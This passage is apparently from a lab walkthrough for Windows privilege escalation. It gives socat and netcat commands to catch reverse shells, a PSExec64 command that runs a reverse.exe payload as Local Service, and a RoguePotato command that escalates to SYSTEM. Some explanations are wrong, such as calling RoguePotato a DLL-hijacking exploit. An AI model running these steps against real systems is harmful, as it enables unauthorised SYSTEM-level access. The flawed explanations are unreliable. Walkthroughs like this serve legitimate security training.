
---

### 🔧 **Step 1: Set Up `socat` Redirector on Kali**

We need to forward Kali's port `135` to port `9999` on the target Windows machine. This can be achieved with **`socat`**:

```bash
sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999
```

- **What it does:** It forwards incoming connections on port `135` of Kali to port `9999` on the target machine (`MACHINE_IP`).
    
- **Why it works:** Port `135` is used by RPC services and might be accessible for exploitation. The idea is to redirect it to the reverse shell port.
    

---

### 🎧 **Step 2: Start a Listener on Kali for Port 135**

You’ll need to set up a listener on Kali to catch incoming connections on port `9999` from the target machine:

```bash
nc -lvnp 9999
```

- **What it does:** Listens for incoming connections on port `9999`.
    
- **Why it works:** After forwarding, the reverse shell will connect to this listener when triggered.
    

---

### 👤 **Step 3: Trigger Reverse Shell as "Local Service" Account**

Log into the target Windows machine via **RDP** as the **admin** user. Once logged in, follow these steps:

1. **Start an elevated command prompt**:
    
    - Right-click **Command Prompt** and choose **Run as Administrator**.
        
2. **Use PSExec64.exe to run `reverse.exe` as the "Local Service" account**:
    
    ```cmd
    C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
    ```
    

- **What it does:** Runs the `reverse.exe` executable under the **Local Service** account with **limited privileges**.
    
- **Why it works:** The reverse shell will connect back to the **Kali listener** on port `9999`.
    

---

### 🎧 **Step 4: Start Another Listener on Kali**

While the reverse shell for **Local Service** is running, set up another listener on Kali to listen for the shell triggered by the **RoguePotato exploit**:

```bash
nc -lvnp 9999
```

- **What it does:** Listens for incoming connections on port `9999` for the reverse shell.
    
- **Why it works:** The second reverse shell will connect to this port after **RoguePotato** is triggered.
    

---

### 💥 **Step 5: Trigger the RoguePotato Exploit to Escalate to SYSTEM**

Now that you have the **Local Service** reverse shell, you can run **RoguePotato** to escalate the privileges to **SYSTEM**.

```cmd
C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
```

- **What it does:**
    
    - `-r 10.10.10.10`: Specifies your **Kali** IP address (where the listener is running).
        
    - `-e "C:\PrivEsc\reverse.exe"`: Executes the reverse shell payload on the **Local Service** account.
        
    - `-l 9999`: Listens for the shell on port `9999`.
        
- **Why it works:** **RoguePotato** exploits **DLL hijacking** in a service running under **Local Service** and elevates the process to **SYSTEM**.
    

---
